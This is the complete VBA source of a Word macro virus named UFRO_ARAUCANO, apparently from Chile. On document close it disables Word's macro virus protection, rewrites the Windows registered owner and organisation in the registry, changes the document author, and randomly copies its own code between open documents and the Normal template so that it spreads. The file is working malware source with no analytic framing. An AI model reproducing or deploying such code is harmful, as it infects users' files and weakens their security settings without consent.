   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   'Nombre del virus: UFRO_ARAUCANO
   'Origen: Temuco - Chile

   Private Sub Document_Close()
   On Error GoTo ARAUCANO
   Options.VirusProtection = False
   System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "RegisteredOwner") = "Temuco Virus Ufro"
   System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "RegisteredOrganization") = "UFRO_ARAUCANO"
   If Month(Now()) = 10 And Day(Now()) = 10 Then MsgBox "UFRO_ARAUCANO", vbInformation, "INFORMACIÓN!!!"
   With Dialogs(wdDialogFileSummaryInfo)
       .Author = "adk-tvu"
       .Execute
   Randomize
   If Int(3 * Rnd) = 1 Then
      UFRO_ARAUCANO
   End If
   ARAUCANO:
   End With
   End Sub
    Private Sub UFRO_ARAUCANO()
   If Not ActiveDocument.VBProject.VBComponents(1).CodeModule.Find("Document_Close", 1, 1, 1000, 1000, False, False) Then
       For I = 1 To NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines
           lineofcode = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(I, 1)
           ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines I * 3, lineofcode
        Next I
       ActiveDocument.SaveAs AddToRecentFiles:=False
   Else
   If Not NormalTemplate.VBProject.VBComponents(1).CodeModule.Find("Document_Close", 1, 1, 1000, 1000, False, False) Then
       For I = 1 To ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
           lineofcode = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(I, 1)
           NormalTemplate.VBProject.VBComponents(1).CodeModule.InsertLines I * 3, lineofcode
       Next I
       NormalTemplate.Save
   End If
   End If
   End Sub
